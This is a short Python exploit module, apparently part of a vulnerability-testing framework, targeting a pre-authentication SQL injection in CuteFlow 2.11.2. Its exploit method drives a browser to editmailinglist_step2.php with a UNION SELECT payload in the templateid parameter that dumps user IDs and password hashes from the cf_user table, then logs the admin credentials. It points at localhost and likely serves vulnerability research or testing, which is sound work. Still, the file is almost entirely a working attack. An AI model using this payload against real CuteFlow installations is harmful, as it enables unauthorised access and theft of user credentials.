import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CUTEFLOW_0005",
                  'Description' : "CuteFlow v2.11.2 SQL-Injection (pre-auth)",
                  'References' :  [['http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/']], 
                  'Target' :      "CuteFlow 2.11.2",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'SQL'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://localhost/cuteflow/pages/editmailinglist_step2.php?templateid=-1 union select 1,concat(strUserId,\":\",strPassword),3,4,5 FROM cf_user--")
        
        element = driver.get_element(by_xpath="//td[text()[contains(.,'admin:')]]")
        self.logger.info("Received Username:Hash %s", element.text)
        
        driver.cleanup()
        return
